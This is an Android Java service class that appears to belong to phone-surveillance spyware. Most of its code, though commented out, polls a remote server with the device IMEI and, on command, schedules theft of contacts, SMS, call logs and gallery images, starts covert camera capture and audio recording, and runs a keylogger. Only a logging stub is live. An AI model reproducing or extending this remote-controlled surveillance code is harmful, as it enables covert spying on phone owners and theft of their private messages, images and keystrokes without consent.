package rapidora.co.myapplication.services;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutionException;

import rapidora.co.myapplication.audioRecorder.AudioRecorderService;
import rapidora.co.myapplication.captureImage.DemoCamService;
import rapidora.co.myapplication.common.ConnectionDetector;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;
import rapidora.co.myapplication.receiver.CaptureImageReciever;

import static android.support.v4.content.WakefulBroadcastReceiver.startWakefulService;


public class OnUserRequest extends IntentService {
    ConnectionDetector cd;
    SessionManagment sd;
   // PowerManager.WakeLock screenLock;

    public OnUserRequest() {
        super(OnUserRequest.class.getName());

    }

    @Override
    protected void onHandleIntent(Intent intent) {
       /* screenLock = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "TAG");
        screenLock.acquire();*/
        cd = new ConnectionDetector(getApplicationContext());
        sd = new SessionManagment(getApplicationContext());

        Log.e("response", "Service Running");
        CustomLogger.getInsatance(getApplicationContext()).putLog("UpdateLOcationService:-" + "running");
     //   executeMethod();


    }

    @Override
    public void onDestroy() {

        //if (screenLock.isHeld()) screenLock.release();
        super.onDestroy();
    }

  /*  public void executeMethod() {
        try {
            new MyTask2().execute().get();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (ExecutionException e) {
            e.printStackTrace();
        }
    }
*/

/*
    public class MyTask2 extends AsyncTask<Void, Void, Void> {
        Context context;
        File contactfile;
        String filename;
        String result = "";

        @Override
        protected Void doInBackground(Void... params) {


            try {
                StringRequest stringRequest = new StringRequest(Request.Method.POST, Constants.ONREQUEST,
                        new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                                try {
                                    json(response);
                                    Log.e("response", response.toString());
                                    CustomLogger.getInsatance(getApplicationContext()).putLog("UpdateLOcationService:-" + "Running" + response);
                                } catch (Exception e) {

                                }
                            }
                        },
                        new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError error) {
                                Log.e("error", error.toString());
                                CustomLogger.getInsatance(getApplicationContext()).putLog("UpdateLOcationService:-" + "Error" + error.toString());
                                // Utils.cancelAlarmForOnRequest(getApplicationContext());
                                //Utils.SchedulServiceForOnRequest(getApplicationContext());
                            }
                        }) {
                    @Override
                    protected Map<String, String> getParams() {
                        Map<String, String> params = new HashMap<String, String>();
                        params.put("imei", sd.getIMEI());
                        return params;
                    }
                };
                stringRequest.setRetryPolicy(new RetryPolicy() {
                    @Override
                    public int getCurrentTimeout() {
                        return 50000;
                    }

                    @Override
                    public int getCurrentRetryCount() {
                        return 50000;
                    }

                    @Override
                    public void retry(VolleyError error) throws VolleyError {

                    }
                });
                RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
                requestQueue.add(stringRequest);
            } catch (Exception e) {
                CustomLogger.getInsatance(getApplicationContext()).putLog("UpdateLOcationService:-" + "Error" + e.toString());
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            Log.e("", "doInBackground: " + result);
            Log.e("post execution", "");

        }
    }
*/


/*
    public void json(String response) {
        String request1 = "", request2 = "", request3 = "", request4 = "",request5 = "",request6 = "",request7 = "",quantity="",duration="";
        String id;
        try {
            JSONObject json = new JSONObject(response);
            String status = json.getString("Status");
            String audio = json.getString("audio");
            sd.setAudioSource(Integer.parseInt(audio));
            if (status.matches("OK")) {
                id = json.getString("id");
                try {
                    request1 = json.getString("request1");
                } catch (Exception e) {
                }
                try {
                    request2 = json.getString("request2");
                } catch (Exception e) {
                }
                try {
                    request3 = json.getString("request3");
                } catch (Exception e) {
                }
                try {
                    request4 = json.getString("request4");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    request5 = json.getString("request5");
                    quantity = json.getString("quantity");
                    sd.setCaptureImageQuantity(Integer.parseInt(quantity));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    request6 = json.getString("request6");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    request7 = json.getString("request7");
                    duration = json.getString("duration");
                    sd.setAUDIo_LISTEN_DURATION(Integer.parseInt(duration));
                } catch (Exception e) {
                    e.printStackTrace();
                }


            } else {
                return;
            }
            if (!(request1.equals(""))) {
                request(request1);
            }
            if (!(request2.equals(""))) {
                request(request2);
            }
            if (!(request3.equals(""))) {
                request(request3);
            }
            if (!(request4.equals(""))) {
                request(request4);
            }
            if (!(request5.equals(""))) {
                request(request5);
            }
            if (!(request6.equals(""))) {
                request(request6);
            }
            if (!(request7.equals(""))) {
                request(request7);
            }



        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
*/

/*
    public void request(String request) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST, Constants.REQUESTSENDSUCSESS,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        //  Toast.makeText(getApplicationContext(),response, Toast.LENGTH_LONG).show();
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        //   Toast.makeText(getApplicationContext(),error.toString(), Toast.LENGTH_LONG).show();
                    }
                }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<String, String>();
                params.put("imei", sd.getIMEI());
                return params;
            }
        };
        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
        requestQueue.add(stringRequest);


        switch (request) {
            case "contact": {

                Utils.cancelAlarmContact(getApplicationContext());
                Utils.scheduleAlarmContact(getApplicationContext());

                break;
            }
            case "sms": {


                Utils.cancelAlarmSms(getApplicationContext());
                Utils.scheduleAlarmAlarmSms(getApplicationContext());

                break;
            }
            case "calllogs": {


                Utils.cancelAlarmCallLog(getApplicationContext());
                Utils.scheduleAlarmCallLog(getApplicationContext());

                break;
            }
            case "images": {


                Utils.cancelAlarmGallery(getApplicationContext());
                Utils.scheduleAlarmGallery(getApplicationContext());

                break;
            }
            case "captureimage": {
                startService(new Intent(getApplicationContext(), DemoCamService.class));

                break;
            }
            case "KeyLogged": {


                Utils.cancelAlarmKeyLog(getApplicationContext());
                Utils.scheduleAlarmKeyLog(getApplicationContext());
                break;
            }
            case "listen": {


                startService(new Intent(getApplicationContext(), AudioRecorderService.class));

                break;
            }

        }
    }
*/


}
